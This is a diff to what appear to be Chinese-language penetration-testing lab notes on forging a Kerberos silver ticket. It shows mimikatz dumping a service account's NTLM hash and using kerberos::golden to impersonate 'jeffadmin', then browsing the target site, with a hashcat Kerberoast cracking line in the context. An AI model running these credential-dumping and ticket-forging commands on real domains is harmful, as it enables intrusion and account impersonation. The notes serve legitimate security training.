@@ -93,9 +93,52 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr
 需要三個東西
 
 * SPN password hash
-* Domain SID
 * Target SPN
+```
+mimikatz # privilege::debug
+Privilege '20' OK
 
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1147751 (00000000:00118367)
+Session           : Service from 0
+User Name         : iis_service
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/14/2022 4:52:14 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1109
+        msv :
+         [00000003] Primary
+         * Username : iis_service
+         * Domain   : CORP
+         * NTLM     : 4d28cf5252d39971419580a51484ca09
+         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
+         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
+```
+
+
+* Domain SID
+`whoami /all`
+
+
+```
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+```
+成功會顯示`Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session`
+
+
+利用票券瀏覽網頁
+```
+$response = Invoke-WebRequest -Uri "http://web04.corp.com/" -UseDefaultCredentials
+$response.Content
+```
+
+or 
+
+```
+$response = iwr -UseDefaultCredentials http://web04
+$response.Content
+```
 
 
 
